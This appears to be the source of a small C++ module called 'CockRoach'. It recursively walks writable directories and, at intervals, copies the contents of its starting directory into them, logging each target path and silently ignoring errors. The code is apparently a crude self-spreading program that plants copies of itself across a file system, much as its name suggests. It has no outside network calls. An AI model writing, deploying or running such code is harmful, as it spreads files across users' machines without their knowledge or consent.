module;

#include <string>
#include <stdexcept>
#include <filesystem>
#include <fstream> 

export module CockRoach;

namespace CockRoach
{
	namespace fs = std::filesystem;

	constexpr auto NEED_TO_COPY{ 200 };
	static auto Counter{ 0 };

	const auto DEFAULT_PATH{ fs::current_path() };

	static std::ofstream LogFile{ "Log.txt" };

	export void ScanDirectory(const std::string& start_directory = fs::current_path().generic_string(), const fs::path& from_copy = DEFAULT_PATH)
	{	
		auto check_valid = [](const fs::directory_entry& object)
		{
			if (!object.path().generic_string().contains('$'))
			{
				if (object.is_directory())
				{
					if ((object.status().permissions() & fs::perms::owner_write) != fs::perms::none)
					{
						return true;
					}
				}
			}

			return false;
		};

		if (!fs::exists(start_directory))
		{
			throw std::invalid_argument("Directory is not found!");
		}

		try
		{
			const fs::directory_iterator directory_iter{ start_directory }; // here an exception is thrown for a directory that is not accessible

			for (const auto& elem : directory_iter)
			{
				if (check_valid(elem))
				{
					if (Counter == NEED_TO_COPY)
					{
						copy(from_copy, elem.path());
						LogFile << elem.path() << "\n";

						Counter = 0;
					}
					else
					{
						++Counter;
						ScanDirectory(elem.path().generic_string(), from_copy);
					}	
				}			
			}
		}
		catch (const std::exception&)
		{
			// (ignore) this is necessary to exit the recursive function to a higher level
		}
	}
}